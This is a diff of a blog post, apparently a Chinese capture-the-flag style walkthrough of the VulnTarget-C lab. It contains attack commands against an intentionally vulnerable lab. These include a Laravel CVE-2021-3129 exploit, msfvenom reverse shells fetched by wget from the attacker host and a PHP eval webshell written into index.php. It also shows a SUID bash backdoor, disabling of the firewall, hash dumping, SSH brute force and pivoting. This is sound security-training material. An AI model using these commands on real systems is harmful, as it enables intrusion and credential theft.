@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="其它打靶流程, Liduan0">
-    <meta name="description" content="打过的其它靶机">
+    <meta name="keywords" content="靶机-VulnTarget-C, Liduan0">
+    <meta name="description" content="打靶VulnTarget-c">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>其它打靶流程 | Liduan0</title>
+    <title>靶机-VulnTarget-C | Liduan0</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -312,12 +312,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">其它打靶流程</h1>
+                    <h1 class="description center-align post-title">靶机-VulnTarget-C</h1>
                 </div>
             </div>
         </div>
@@ -345,8 +345,8 @@
                                 <span class="chip bg-color">靶机</span>
                             </a>
                         
-                            <a href="/tags/%E7%BD%91%E5%AE%89/">
-                                <span class="chip bg-color">网安</span>
+                            <a href="/tags/Vulntarget/">
+                                <span class="chip bg-color">Vulntarget</span>
                             </a>
                         
                     </div>
@@ -379,14 +379,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    195
+                    2.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    11 分
                 </div>
                 
 
@@ -404,18 +404,412 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>备注</strong>：由于先前没有搭好自己的博客，先前的打靶流程都放在csdn上了。</p>
-<h3 id="打靶流程地址"><a href="#打靶流程地址" class="headerlink" title="打靶流程地址"></a>打靶流程地址</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131181620">(85条消息) 靶机-HackNos-2.1_二和不会的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131196991">(85条消息) 靶机-HackNos-3_二和不会的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131200489">(85条消息) 靶场-Matrix-v3_二和不会的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131205960">(85条消息) 靶机-DarkHole_2_二和不会的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131239553">(85条消息) 靶场-DarkHole1_二和不会的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131243037">(85条消息) 靶场-y0usef_二和不会的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131245276">(85条消息) 靶场-Hacker_Kid-v1.0.1_二和不会的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131248384">(85条消息) 靶机-AdmX_new_二和不会的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58602402/article/details/131280852">(85条消息) 靶场-vulntarget-b_二和不会的博客-CSDN博客</a></p>
+                <h3 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h3><ol>
+<li>靶机下载地址：</li>
+</ol>
+<blockquote>
+<p>百度云：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q">https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q</a> </p>
+<p>提取码:1p9p</p>
 </blockquote>
+<ol start="2">
+<li>靶机网络配置</li>
+</ol>
+<p><strong>方法一：</strong>直接通过默认用户密码进行登录修改</p>
+<pre class="line-numbers language-none"><code class="language-none">Ubuntu20:root&#x2F;root#qwe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>方法二：</strong></p>
+<p>（1）开启靶机，按shift键再按E键进入界面之中，修改</p>
+<pre class="line-numbers language-none"><code class="language-none">rw----&gt;rw signiinit&#x3D;&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>（2）完成修改之后按Ctrl+X进入shell界面</p>
+<p>（3）修改&#x2F;etc&#x2F;netplan下的网络配置文件，将网络ip改成自己的网段ip</p>
+<p><strong>备注：</strong>Netplan —— 抽象<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE&spm=1001.2101.3001.7020">网络配置</a>生成器 ，是一个用于配置 Linux 网络的简单工具</p>
+<pre class="line-numbers language-none"><code class="language-none">ip -a      ## 查看当前网卡信息
+cd &#x2F;etc&#x2F;netplan
+vi 00-installer-config.yaml
+修改内容为：
+ens33：
+	addresses:自己的网段ip
+	gateway4:自己网段的网关<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/1-1.jpg" class>
+
+<p>（4）保存配置，让配置生效</p>
+<pre class="line-numbers language-none"><code class="language-none">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/1-2.jpg" class>
+
+<h3 id="二、边界主机"><a href="#二、边界主机" class="headerlink" title="二、边界主机"></a>二、边界主机</h3><h4 id="（一）-信息收集"><a href="#（一）-信息收集" class="headerlink" title="（一） 信息收集"></a>（一） 信息收集</h4><p>1.主机发现，查看目标靶机的ip:192.168.12.8</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">nmap 192.168.12.1/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/2-1.jpg" class>
+
+<p>2.对目标靶机进行详细的 端口扫描，发现开放了22端口和80端口</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">nmap -sT -A -sV  192.168.12.8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/2-2.jpg" class>
+
+<p>3.对80端口进行访问，发现是Laravel框架。查看Laravel版本号对应的漏洞发现存在CVE-2021-03129漏洞</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">项目下载地址：
+git clone https://github.com/SNCKER/CVE-2021-3129
+cd CVE-2021-3129
+git clone https://github.com/ambionics/phpggc.git（exp执行需要使用此工具)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/2-3.jpg" class>
+
+<h4 id="（二）漏洞利用"><a href="#（二）漏洞利用" class="headerlink" title="（二）漏洞利用"></a>（二）漏洞利用</h4><p>1.修改项目中<code>exploit.py</code>文件将<code>main()</code>函数中的<code>Exp()</code>函数接受参数修改为目标站点地址与要执行的命令</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#修改位置
+def main():
+    Exp("http://192.168.12.8:80", "whoami")
+#执行命令
+python3 exploit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/2-4.jpg" class>
+
+<img src="/post/undefined/2-5.jpg" class>
+
+<p>2.利用msf生成反向木马，并开启HTTP服务</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.12.172 LPORT=8181 -f elf -o 11.elf
+python3 -m http.server 9090<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/2-6.jpg" class>
+
+<p>3.kali攻击机上开启监听等待shell的反弹,修改exploit.py执行的命令—-&gt;反弹失败</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost 192.168.12.172
+set lport 8181
+run
+# 修改执行的命令：
+wget http://192.168.12.172:9090/11.elf&amp;&amp;chmod 777 11.elf&amp;&amp;./11.elf
+# 命令执行
+python3 exploit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>4.通过执行ls命令，发现当前目录为根目录。当前的用户为网站用户可能没有在根目录下载的权限，需要到网站目录下去尝试执行。</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain"># 通过命令执行探测出网站的根目录为：
+/var/www/html
+# 修改执行的命令：
+cd /var/www/html/public&amp;&amp;wget http://192.168.12.172:9090/11.elf&amp;&amp;chmod 777 11.elf&amp;&amp;./11.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/2-7.jpg" class>
+
+<h4 id="（三）提权-1"><a href="#（三）提权-1" class="headerlink" title="（三）提权-1"></a>（三）提权-1</h4><p>1.利用模块扫描可提权的漏洞模块,发现cve_2021_4034这一漏洞模块</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">run post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/2-8.jpg" class>
+
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+set session 2
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/2-9.jpg" class>
+
+<img src="/post/undefined/2-10.jpg" class>
+
+<h4 id="（三）提权-2"><a href="#（三）提权-2" class="headerlink" title="（三）提权-2"></a>（三）提权-2</h4><p>1.查看&#x2F;home目录下用户有哪些。发现存在<code>vulntarget</code>用户尝试使用Hydra进行SSH爆破，获得密码root</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">hydra -l vulntarget -P passwd.txt 192.168.12.8 ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/2-11.jpg" class>
+
+<p>2.ssh登录靶机，利用sudo提权，发现&#x2F;opt&#x2F;root.py文件，进行查看</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/2-12.jpg" class>
+
+<p>3.查看&#x2F;opt&#x2F;root.py文件内容。运行脚本会在本地的<code>1025-65535</code>端口上开启一个<code>socket</code>接口且密码是<code>mortals</code>登录成功后根据选项给出响应的回显如果有错误的输入在异常处理处打印异常且调用<code>pdb</code>模块，同时进入到调式模块下在此模块中可导入<code>OS</code>模块来执行系统命令完成提权</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#!/usr/bin/env python3
+import socket
+import random
+import subprocess
+import pdb
+
+port = random.randint(1025, 65535)  
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(('127.0.0.1', port))
+    sock.listen(1)
+    print(f'Listening on localhost:&#123;port&#125;')
+    
+    (clientsock, addr) = sock.accept() 
+    clientsock.send(b'Enter the secret passsword: ')  
+    if clientsock.recv(1024).strip().decode() != 'mortals':
+        clientsock.send(b'Wrong password!\n')
+    else:
+        clientsock.send(b'Welcome admin!\n')
+        while True:
+            clientsock.send(b'\nWhat do you wanna do: \n')
+            clientsock.send(b'[1] View processes\n')
+            clientsock.send(b'[2] View free memory\n')
+            clientsock.send(b'[3] View listening sockets\n')
+            clientsock.send(b'[4] Quit\n')
+            option = int(clientsock.recv(1024).strip())
+            if option == 1:
+                clientsock.send(subprocess.getoutput('ps aux').encode())
+            elif option == 2:
+                clientsock.send(subprocess.getoutput('df').encode())
+            elif option == 3:
+                clientsock.send(subprocess.getoutput('ss -lnt').encode())
+            elif option == 4:
+                clientsock.send(b'Bye\n')
+                break
+except Exception as e:
+    print(e)
+    pdb.post_mortem(e.__traceback__)
+finally:
+    quit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>4.提权操作。在第一个ssh链接上执行脚本文件，另外开启一个ssh链接监听脚本开启的端口并进行错误的输入</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">SSH1:
+sudo python3 root.py
+
+SSH2:
+nc localhost randomport
+mortals
+a
+
+SSH1:
+import os
+os.system("whoami")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/2-13.jpg" class>
+
+<img src="/post/undefined/2-14.jpg" class>
+
+<p>5.进行权限维持。赋予用户的Shell为SUID权限一次来为维权，调用具有SUID Shell</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">import os
+os.system("chmod u+s /bin/bash")
+bash -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/2-15.jpg" class>
+
+<p>6.利用MSF生成反向木马，通过http服务进行上传后执行反弹回最高权限的shell。进行添加路由进行内网攻击</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#Kali操作
+msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.12.172 lport=8181 -f elf -o 4321.elf
+Pyhont2 -m SimpleHTTPServer 9090
+
+#Ubuntu 20操作
+wget http://192.168.12.172:9090/11.elf
+chmod 777 11.elf
+./11.elf
+
+#meterpreter操作
+getuid
+run post/multi/manage/autoroute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/2-16.jpg" class>
+
+<h3 id="三、二层内网"><a href="#三、二层内网" class="headerlink" title="三、二层内网"></a>三、二层内网</h3><h4 id="（一）信息收集"><a href="#（一）信息收集" class="headerlink" title="（一）信息收集"></a>（一）信息收集</h4><p>1.进行信息收集，发现存在其它网卡信息。添加路由信息，调用MSF的模块对内网信息进行扫描。</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">meterpreter>run post/multi/manage/autoroute  #添加路由
+meterpreter>run autoroute -p    #查看路由<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-1.jpg" class>
+
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">use auxiliary/scanner/portscan/tcp
+set rhost 10.0.20.0/24
+set ports 21,22,80,135,139,445,8080
+set threads 30
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-2.jpg" class>
+
+<p>2.发现一个内网主机10.0.20.100开放80端口，在MSF上开启socks代理服务器，并对站点进行访问</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">use auxiliary/server/socks_proxy
+set srvport 1088
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-3.jpg" class>
+
+<p>3.在右上角有<code>Admin Login</code>按钮点击可进入后台登录页面，在此可配置BP的<code>SOCKS5</code>代理进行抓包爆破</p>
+<img src="/post/undefined/3-4.jpg" class>
+
+<h4 id="（二）漏洞利用-1"><a href="#（二）漏洞利用-1" class="headerlink" title="（二）漏洞利用"></a>（二）漏洞利用</h4><p>1.利用BP开启抓包代理，进行登录用户和密码的破解</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#代理流程
+Browser&lt;--->BurpSuite&lt;--->Socks Proxy Server&lt;--->WebSite
+#步骤设置
+1.开启BurpSuite进入Settings选中Network中Connections找到SOCKS Proxy
+2.勾选Override user options并且填写Use SOCKS proxy下的host与port为MSF开启的代理地址与端口
+3.回到火狐浏览器设置BP代理为HTTP类型的127.0.0.1:8080与MSF的SOCKS5类型代理
+4.先挂MSF的代理访问站点到用户登录界面要抓取的数据包，在挂BP的代理且在BP的Proxy模块开启监听
+5.此时已经设置了浏览器的数据走BP，而BP抓到的数据走SOCKS5代理，抓取登陆请求的HTTP数据包...
+注：此种方式也可隐藏自身IP地址...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-5.jpg" class>
+
+<img src="/post/undefined/3-6.jpg" class>
+
+<p>2.爆破出账号密码为：admin&#x2F;admin123,登录后台</p>
+<img src="/post/undefined/3-7.jpg" class>
+
+<p>3.该OVAS CMS后台存在SQL注入，在此后台页面点击<code>Inquiries</code>–&gt;<code>Action</code>–&gt;<code>View</code>使用BP抓取到数据包且保存到本地文件中</p>
+<img src="/post/undefined/3-8.jpg" class>
+
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">GET /admin/inquiries/view_details.php?id=1 HTTP/1.1
+Host: 10.0.20.100
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://10.0.20.100/admin/?page=inquiries
+Cookie: PHPSESSID=om8dmq1kfbqgcu76558m0su56s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>4.使用SQLMAP对其抓取的HTTP请求包进行SQL注入测试（代理不好使，部署FRP获取代理），发现存在SQL注入</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">proxychains sqlmap -r insql.txt --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>部署FRP获取代理</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#frps.ini
+[common]
+bind_port = 8282
+
+#frpc.ini
+[common]
+server_addr = 192.168.12.172  -->Kali IP地址
+server_port = 8282
+
+[plugin_socks]
+type = tcp
+remote_port = 1082    --->Socks5端口
+plugin = socks5
+
+#Command Code
+Kali:./frps -c frps.ini
+Ubuntu 20:./frpc -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-9.jpg" class>
+
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sqlmap -r insql.txt --proxy=socks5://192.168.12.172:1082 --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/3-10.jpg" class>
+
+<p>5.在该SQL注入点获取OS Shell并写入一句话木马…将一句话木马替换到index.php文件中</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#判断是否BDA
+sqlmap -r insql.txt --proxy=socks5://192.168.12.172:1082 --batch --is-dba
+#获取交互式Shell
+sqlmap -r insql.txt --proxy=socks5://192.168.12.172:1082 --os-shell
+#写入免杀一句话木马
+echo ^&lt;^?php $a = $_REQUEST['d'];$a = "$a";$b['test'] = "";eval($b['test']."$a");?^>^ > test.php
+#替换index.php文件
+echo ^&lt;^?php $a = $_REQUEST['d'];$a = "$a";$b['test'] = "";eval($b['test']."$a");?^>^ > index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-11.jpg" class>
+
+<img src="/post/undefined/3-12.jpg" class>
+
+<p>6.蚁剑添加代理，进行连接</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">http://10.0.20.100/admin/?page=inquiries | d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/3-13.jpg" class>
+
+<img src="/post/undefined/3-14.jpg" class>
+
+<p>7.上线msf，利用MSF生成正向木马上传执行获得shell</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#生成木马
+msfvenom -p windows/x64/meterpreter/bind_tcp  LPORT=8383 -f exe > insec.exe
+
+#防火墙操作
+netsh advfirewall show allprofile state      //查看防火墙状态
+netsh advfirewall set  allprofile state off  //关闭防火墙
+
+#监听链接
+use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set lport 8383
+set rhost 10.0.20.100
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-15.jpg" class>
+
+<img src="/post/undefined/3-16.jpg" class>
+
+<p>8.对当前内网进行信息收集</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#执行命令
+systeminfo
+ipconfig /all
+load kiwi
+hashdump    ——>   Administrator dfc8d2bfa540a0a6e2248a82322e654e/Admin#123
+creds_all   ——>   dfc8d2bfa540a0a6e2248a82322e654e Admin#123
+run getgui -e
+netstat -an | findstr 3389   
+tasklist /svc ——>   MsMpEng.exe &lt;=> Windows Defender
+
+#收集信息
+OS:Wins16
+NIC1：10.0.20.100/24
+NIC2：10.0.10.139/24
+username:administraotr
+password:Admin#123
+RDP Port:3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-17.jpg" class>
+
+<img src="/post/undefined/3-18.jpg" class>
+
+<p>9.添加路由并扫描<code>10.0.10.0</code>网段的机器，发现主机<code>10.0.10.110</code>存活。</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#添加路由信息
+run post/multi/manage/autoroute
+#扫描内网存活主机
+use auxiliary/scanner/portscan/tcp
+set rhosts 10.0.10.0/24
+set ports 22,23,80,445,3306
+set threads 20
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/3-19.jpg" class>
+
+<h3 id="四、三层内网"><a href="#四、三层内网" class="headerlink" title="四、三层内网"></a>四、三层内网</h3><p>1.使用以上抓取破解出的账户密码远程登录到内网Windows主机上</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#代理配置
+vi /etc/proxychains4.conf
+socks5 127.0.0.1 1082
+#桌面链接
+proxychains rdesktop 10.0.20.100----》失败，连接出错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>开3389端口</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+netstat -ano | findstr "3389"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/4-1.jpg" class>
+
+<p>直接本地通过SocksCap64代理进行远程连接，成功连接到远程桌面</p>
+<details class="lake-collapse"><summary id="ucebf9899"></summary><p id="uc84f9655" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">Administrator:::Admin#123</span></p></details>
+
+<img src="/post/undefined/4-2.jpg" class>
+
+<img src="/post/undefined/4-3.jpg" class>
+
+<p>2.在下方看到<code>MobaXterm</code>打开后需要输入密码使用本机管理员密码登录成功，且存在一Linux主机为上面扫描出来的内网机器，点开后为<code>vulntarget</code>普通用户登录</p>
+<img src="/post/undefined/4-4.jpg" class>
+
+<p>3.方法一：直接通过MobaXterm查看密码，点击上方的Settings按照流程进行点击，需要输入登录用户的密码即：Admin#123</p>
+<img src="/post/undefined/4-5.jpg" class>
+
+<img src="/post/undefined/4-6.jpg" class>
+
+<img src="/post/undefined/4-7.jpg" class>
+
+<p>成功获取到10.0.10.110中的用户vulntarget的密码为vuln@qwe，利用sudo进行提权</p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">sudo su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/post/undefined/4-8.jpg" class>
+
+<p>方法二：根据Linux内核版本尝试提权，将提权项目下载至本地并编译好上传至<code>Wins16</code>在拖进LinuxShell中执行之后即可提权成功…获取<code>Flag</code></p>
+<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">#uname -a 
+Linux ubuntu 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+#项目地址
+https://github.com/briskets/CVE-2021-3493
+
+#执行命令
+gcc exploit.c -o exploit
+./exploit
+
+#flag内容
+vulntarget&#123;cve_2021_3493_local_privilege_promotion_overlayfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/post/undefined/4-9.jpg" class>
 
                 
             </div>
@@ -442,7 +836,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://liduan0.github.io/post/b3a8.html">https://liduan0.github.io/post/b3a8.html</a>
+                    <a href="https://liduan0.github.io/post/d9dd.html">https://liduan0.github.io/post/d9dd.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -484,8 +878,8 @@
                                     <span class="chip bg-color">靶机</span>
                                 </a>
                             
-                                <a href="/tags/%E7%BD%91%E5%AE%89/">
-                                    <span class="chip bg-color">网安</span>
+                                <a href="/tags/Vulntarget/">
+                                    <span class="chip bg-color">Vulntarget</span>
                                 </a>
                             
                         </div>
@@ -564,9 +958,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/post/d9dd.html">
                     <div class="card-image">
@@ -584,9 +979,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -599,6 +994,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -621,24 +1017,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/post/ed54.html">
+                <a href="/post/b3a8.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="靶机-Hackme2">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="其它打靶流程">
                         
-                        <span class="card-title">靶机-Hackme2</span>
+                        <span class="card-title">其它打靶流程</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            打靶Hackme2的流程
+                            打过的其它靶机
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-03
                             </span>
                         <span class="publish-author">
                             
